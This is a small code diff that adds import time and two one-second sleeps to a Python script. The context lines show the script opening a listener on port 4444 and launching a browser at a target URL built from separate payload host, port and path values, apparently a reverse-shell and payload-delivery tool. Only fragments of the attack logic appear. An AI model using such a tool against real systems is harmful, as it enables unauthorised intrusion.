@@ -1,4 +1,5 @@
 import subprocess
+import time
 import webbrowser
 
 
@@ -10,6 +11,7 @@ def foo():
     choice = raw_input().lower()
     if choice in yes:
         print("Ok. Opening port 4444.")
+        time.sleep(1)
         listen(port)
         print("Connection closed.")
         return True
@@ -35,6 +37,7 @@ def connect_to_target():
         target_ip, target_port, payload_url, payload_port, payload_path)
 
     print("Connecting to target...")
+    time.sleep(1)
     webbrowser.open(target_url, new=0, autoraise=False)
     print("Connected to " + target_url + "\n")
 
